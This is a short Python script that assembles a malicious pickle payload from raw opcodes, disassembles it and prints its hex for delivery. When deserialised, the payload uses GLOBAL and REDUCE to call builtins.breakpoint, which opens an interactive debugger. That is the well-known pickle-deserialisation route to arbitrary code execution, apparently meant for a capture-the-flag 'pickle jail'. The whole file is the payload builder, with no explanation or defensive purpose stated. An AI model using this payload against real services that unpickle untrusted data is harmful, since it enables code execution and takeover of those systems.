from pickle import *
from pickletools import dis

p = b""

p += PROTO
p += b'\x05'
p += GLOBAL
p += b'builtins\n'
p += b'breakpoint\n'
p += EMPTY_TUPLE
p += REDUCE
p += STOP

dis(p)
print("="*50)
print(p.hex())
